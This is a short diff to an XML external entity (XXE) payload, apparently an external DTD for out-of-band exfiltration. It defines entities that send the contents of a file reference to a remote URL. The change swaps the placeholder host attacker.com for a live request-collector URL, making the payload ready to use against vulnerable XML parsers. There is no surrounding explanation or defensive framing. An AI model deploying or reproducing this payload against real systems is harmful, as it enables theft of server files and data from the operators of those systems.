@@ -1,2 +1,2 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?collect=%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://end7l0yp0boy.x.pipedream.net/?collect=%file;'>">
 %all;
